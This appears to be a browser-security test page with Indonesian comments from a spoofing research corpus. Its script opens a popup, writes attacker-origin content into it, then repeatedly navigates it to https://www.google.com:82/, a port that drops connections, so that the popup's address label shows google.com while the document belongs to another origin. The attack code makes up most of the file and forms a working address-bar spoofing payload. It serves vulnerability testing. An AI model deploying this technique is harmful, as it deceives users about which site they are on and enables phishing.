<!-- UPGRADE M2 -> M1. Koordinat baru: G=popup-ber-window-features x A=dead-port.
     Korpus punya dead-port di TAB (17-minimal/01) dan popup chromeless TANPA hang (batch20 #13);
     gabungan "popup yang label-nya sudah kosong, lalu diisi URL PENDING" belum ada file-nya.
     PREDIKAT: label popup menulis www.google.com sementara dokumennya milik origin penyerang.
     EXPECTED-SECURE: label tetap kosong/about:blank/origin asli - URL hanya muncul saat COMMIT.
     Port 82 dipilih karena DI-DROP (timeout); port yang me-RST memicu error-page commit instan = bar jujur lagi.
     Interval 9800 ms menembak ulang tepat sebelum timeout jaringan ~10 s. Pasangkan dengan 03 sbg baseline. -->
<script>
var T = 'https://www.google.com:82/';
function m1(){
  var w = window.open('', '_blank', 'width=420,height=320');
  w.document.write('<h2>Dokumen ini milik ' + location.origin + ' &mdash; BUKAN google.com</h2>');
  w.location = T;                                              // SWAP: label mulai mengecat T (pending)
  setInterval(function(){ w.location = T; }, 9800);            // HOLD: arm-ulang sebelum timeout
}
</script>
<button onclick="m1()">M1 &mdash; origin PALSU di label popup</button>
